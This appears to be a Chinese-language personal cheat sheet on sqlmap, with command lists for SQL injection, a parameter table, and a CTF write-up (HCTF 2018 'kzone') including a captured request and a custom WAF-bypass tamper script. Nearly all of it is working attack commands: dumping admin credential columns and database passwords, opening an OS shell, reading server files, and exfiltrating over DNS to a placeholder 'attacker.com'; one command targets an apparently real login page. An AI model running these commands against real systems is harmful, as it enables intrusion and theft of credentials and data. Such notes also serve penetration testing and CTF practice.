[手把手教你编写SQLMap的Tamper脚本过狗](https://mp.weixin.qq.com/s/2Nw1CbXsrEz0sM3GbOo68g)

# sqlmap
https://blog.csdn.net/Litbai_zhang/article/details/87939785

自写脚本
https://www.cnblogs.com/afanti/p/9949660.html
https://xz.aliyun.com/t/3245#toc-4

测试post注入

```sh
sqlmap -u http://vip.fj0730.cn/login.asp --forms
sqlmap -u http://url.php?id=1 --current-db --batch
sqlmap -u http://url.php?id=1 --current-user
sqlmap -u http://url.php?id=1 --dbs # all databases
sqlmap -u http://url.php?id=1 --is-dba
sqlmap -u http://url.php?id=1 -D test --tables           # 得到admin
sqlmap -u http://url.php?id=1 -D test -T admin --columns # 得到admin,pass
sqlmap -u http://url.php?id=1 -D test -T admin -C admin,pass --dump
sqlmap -u http://url.php?id=1 -D test -T admin -C admin,pass --dump --hex
sqlmap -u http://url.php?id=1 --os-shell

sqlmap -r b.txt --passwords --batch     # bp抓包保存为 b.txt
sqlmap -r Filename.txt --dbs --level=3
sqlmap -l log.txt                       # 使用 bp log文件 （勾选上options中的Misc中的proxy）

sqlmap -u "<url>" --is-dba #  检测有无dba权限可写入
```

# sqlmap manual

[SQLMap命令详解及使用操作](https://blog.csdn.net/yinghua1234/article/details/105999231?utm_source=app)

[tamper](https://securityonline.info/sqlmap-tamper-script-bypassing-waf/)

```sh
# POST: 将请求保存成3.txt
sqlmap  -r 3.txt --technique T --level 3 --tamper=space2comment
sqlmap  -r 3.txt --technique T --level 3 --tamper=space2comment -D injection -T admin --dump
sqlmap -u url --search -C "flag"
sqlmap -u url --file-read="/flag"

sqlmap -u http://可能注入的某个提交参数的url --cookie="这次提交的cookie"
sqlmap -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper "space2comment.py" --current-db --batch # database
sqlmap -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper "space2comment.py" -D web1 --tables     # tables
sqlmap -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper "space2comment.py" -D web1 -T flag --columns # columns
sqlmap -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper "space2comment.py" -D web1 -T flag -C flag --dump # dump data
```

--technique

指定sqlmap使用的检测技术，默认情况下会测试所有的方式。

Boolean-based blind, Error-based, Union query-based, Stacked queries(对文件系统、操作系统、注册表操作时，必须指定该方式), Time-based blind


| Params         | Description                                                  |
| -------------- | ------------------------------------------------------------ |
| --time-sec     | 延迟时间，时间盲注默认5秒                                    |
| --union-cols   | 联合查询时默认是1-10列，当level=5时会增加到测试50个字段数，可以使用此参数设置查询的字段数。 |
| --union-char   | 默认情况下sqlmap针对UNION查询的注入会使用NULL字符；有些情况下使用NULL字符会造成页面返回失败，而使用一个随机整数是成功的，可以使用--union-char指定UNION查询的字符。 |
| --dns-domain   | 攻击者控制了某DNS服务器，使用此功能可以提高数据查询的速度  如：--dns-domain="attacker.com" |
| --second-order | 有些时候注入点输入的数据，返回的结果并不是当前页面，而是另外一个页面。使用此参数指定到哪个页面获取响应判断真假，--second-order后面跟一个判断页面的URL地址。例如：--second-order="http://1.1.1.1/a.php" |

[SQLMap中tamper的简介](https://blog.csdn.net/Litbai_zhang/article/details/99681398)

#### sqlmap 脚本

a.txt:
```python
POST /admin/list.php HTTP/1.1
Host: kzone.2018.hctf.io
Content-Length: 33
Cache-Control: max-age=0
Origin: http://kzone.2018.hctf.io
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Referer: http://kzone.2018.hctf.io/admin/login.php
Accept-Encoding: gzip, deflate
X-Forwarded-For: 127.0.1.3,1,2,3,4
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Cookie: PHPSESSID=7notm2n004aen7oln00ohd9ei3; islogin=1; login_data=*
Connection: close

user=rr123&pass=rr123&login=Login
```
Command:

`python sqlmap.py -r a.txt --tamper=hctf --dbs --dbms=mysql --thread=10 -D hctf_kouzone -T F1444g -C F1a9 --dump -v3`

tamper/hctf.py

```python
#!/usr/bin/env python
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    data = '''{"admin_user":"%s"};'''
    payload = payload.lower()

    payload = payload.replace('u', '\u0075')
    payload = payload.replace('o', '\u006f')
    payload = payload.replace('i', '\u0069')
    payload = payload.replace('\'', '\u0027')
    payload = payload.replace('\"', '\u0022')
    payload = payload.replace(' ', '\u0020')
    payload = payload.replace('s', '\u0073')
    payload = payload.replace('#', '\u0023')
    payload = payload.replace('>', '\u003e')
    payload = payload.replace('<', '\u003c')
    payload = payload.replace('-', '\u002d')
    payload = payload.replace('=', '\u003d')
    payload = payload.replace('f1a9', 'F1a9')
    payload = payload.replace('f1', 'F1')
    return data % payload
```

## technique
--technique=T 基于时间盲注
